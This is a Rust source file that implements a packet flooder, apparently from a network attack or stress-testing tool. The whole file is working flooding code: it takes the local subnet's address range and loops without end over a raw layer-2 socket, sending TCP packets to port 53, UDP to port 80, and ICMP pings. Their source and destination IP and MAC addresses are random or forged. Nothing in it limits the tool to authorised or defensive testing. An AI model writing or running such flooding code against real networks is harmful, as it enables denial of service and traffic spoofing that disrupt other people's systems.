use std::net::Ipv4Addr;
use crate::arg_parser::FloodArgs;
use crate::generators::{Ipv4Iter, RandValues};
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::inline_display;



pub struct PacketFlooder {
    args:      FloodArgs,
    start:     u32,
    end:       u32,
    pkts_sent: usize,
    rng:       RandValues,
}



impl PacketFlooder {

    pub fn new(args: FloodArgs) -> Self {
        Self {
            args,
            start:     0,
            end:       0,
            pkts_sent: 0,
            rng:       RandValues::new(),
        }
    }



    pub fn execute(&mut self){
        self.set_ip_range();
        self.set_proto_flags();
        self.send_endlessly();
    }



    fn set_ip_range(&mut self) {
        let cidr         = IfaceInfo::iface_network_cidr(&self.args.iface);
        let mut ip_range = Ipv4Iter::new(&cidr, None, None);
        let first_ip     = ip_range.next().expect("No IPs in range");
        let last_ip      = Ipv4Addr::from(u32::from(first_ip) + ip_range.total() as u32 - 3);
        self.start       = first_ip.into();
        self.end         = last_ip.into();
    }



    fn set_proto_flags(&mut self) {
        if !self.args.tcp && !self.args.udp && !self.args.icmp {
            self.args.tcp  = true;
            self.args.udp  = true; 
            self.args.icmp = true;
        }
    }



    fn setup_tools(iface: &str) -> PktTools {
        PktTools {
            info:    PacketInfo::new(),
            builder: PacketBuilder::new(),
            socket:  Layer2RawSocket::new(&iface),
        }
    }



    fn send_endlessly(&mut self) {
        let mut tools = Self::setup_tools(&self.args.iface);

        let fixed_src_ip  = self.args.src_ip;
        let fixed_src_mac = self.args.src_mac;
        let fixed_dst_ip  = self.args.dst_ip;
        let fixed_dst_mac = self.args.dst_mac;

        loop {
            tools.info.src_port = self.rng.get_random_port();
            tools.info.src_ip   = fixed_src_ip.unwrap_or_else( || self.rng.get_random_ip(self.start, self.end));
            tools.info.src_mac  = fixed_src_mac.unwrap_or_else(|| self.rng.get_random_mac());
            tools.info.dst_ip   = fixed_dst_ip.unwrap_or_else( || self.rng.get_random_ip(self.start, self.end));
            tools.info.dst_mac  = fixed_dst_mac.unwrap_or_else(|| self.rng.get_random_mac());
            
            self.send_packets(&mut tools);
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
    }



    #[inline]
    fn send_packets(&mut self, tools: &mut PktTools) {
        if self.args.tcp {
            Self::send_tcp(tools);
            self.pkts_sent += 1;
        }

        if self.args.udp {
            Self::send_udp(tools);
            self.pkts_sent += 1;
        }
        
        if self.args.icmp {
            Self::send_icmp(tools);
            self.pkts_sent += 1;
        }
    }



    #[inline]
    fn send_tcp(tools: &mut PktTools) {
        let tcp_pkt = tools.builder.tcp_ether(
            tools.info.src_mac, tools.info.src_ip, tools.info.src_port,
            tools.info.dst_mac, tools.info.dst_ip, 53
        );
        tools.socket.send(tcp_pkt);
    }



    #[inline]
    fn send_udp(tools: &mut PktTools) {
        let udp_pkt = tools.builder.udp_ether(
            tools.info.src_mac, tools.info.src_ip, tools.info.src_port,
            tools.info.dst_mac, tools.info.dst_ip, 80
        );
        tools.socket.send(udp_pkt);
    }



    #[inline]
    fn send_icmp(tools: &mut PktTools) {
        let icmp_pkt = tools.builder.icmp_ping_ether(
            tools.info.src_mac, tools.info.src_ip,
            tools.info.dst_mac, tools.info.dst_ip
        );
        tools.socket.send(icmp_pkt);
    }

}



struct PktTools {
    info:    PacketInfo,
    builder: PacketBuilder,
    socket:  Layer2RawSocket
}



struct PacketInfo {
    src_mac:  [u8; 6],
    src_ip:   Ipv4Addr,
    src_port: u16,
    dst_mac:  [u8; 6],
    dst_ip:   Ipv4Addr,
}


impl PacketInfo {
    fn new() -> Self {
        Self {
            src_mac:  [0; 6],
            src_ip:   Ipv4Addr::new(0, 0, 0, 0),
            src_port: 0,
            dst_mac:  [0; 6],
            dst_ip:   Ipv4Addr::new(0, 0, 0, 0)
        }
    }
}